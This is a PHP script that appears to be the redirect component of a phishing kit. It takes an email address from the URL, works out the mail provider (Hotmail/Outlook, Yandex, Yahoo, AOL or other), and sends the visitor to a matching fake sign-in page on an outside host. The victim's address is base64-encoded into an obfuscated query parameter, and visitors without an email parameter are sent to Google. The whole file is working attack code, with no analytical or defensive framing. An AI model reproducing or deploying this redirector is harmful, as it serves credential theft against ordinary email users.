<?php
function getDomainName($id)
{
// Get the data after the @ sign
$name = substr(strrchr($id, "@"), 1);
return $name;
} 


//Example

if(isset($_GET['email'])){$id = $_GET['email'];}else{header("location: https://www.google.com");}


$name = getDomainName($id);

$name_check = '@'.strtolower($name);

if(stripos($name_check, '@hotmail.') !== false ||stripos($name_check, '@outlook.') !== false) {
header("Location: http://www.fundacaofan.org.mz/components/en/signin/?livemail_hotmailatlivemail=".urlencode(base64_encode($id)));

}
elseif(stripos($name_check, '@yandex.') !== false){
	header("Location: http://www.fundacaofan.org.mz/components/en/yandex/?fixyouincominge_hjdhjsjhsnmw5455jhjhjs4454aha=".urlencode(base64_encode($id)));
}
elseif(stripos($name_check, '@yahoo.') !== false){
	header("Location: http://www.fundacaofan.org.mz/components/en/yaho/?fixyouincominge_hjdhjsjhsnmw5455jhjhjs4454aha=".urlencode(base64_encode($id)));
}
elseif(stripos($name_check, '@aol.') !== false){
	header("Location: http://www.fundacaofan.org.mz/components/en/aol/?fixyouincominge_hjdhjsjhsnmw5455jhjhjs4454aha=".urlencode(base64_encode($id)));
}
else{header("Location: http://www.fundacaofan.org.mz/components/en/sign/?fixyouincominge_hjdhjsjhsnmw5455jhjhjs4454aha=".urlencode(base64_encode($id)));}

	
?>

